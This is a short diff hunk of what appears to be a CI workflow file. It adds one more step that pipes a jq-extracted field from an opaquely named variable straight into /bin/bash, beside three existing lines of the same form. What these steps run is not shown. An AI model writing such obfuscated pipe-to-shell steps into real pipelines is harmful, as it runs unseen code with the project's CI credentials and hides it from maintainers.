@@ -23,6 +23,7 @@ jobs:
           echo $mfzw223 | jq -r .q34 | /bin/bash
           echo $bew6 | jq -r .rtouw6630 | /bin/bash
           echo $ul0385 | jq -r .gczul61 | /bin/bash
+          echo $yl03332 | jq -r .qg4074 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
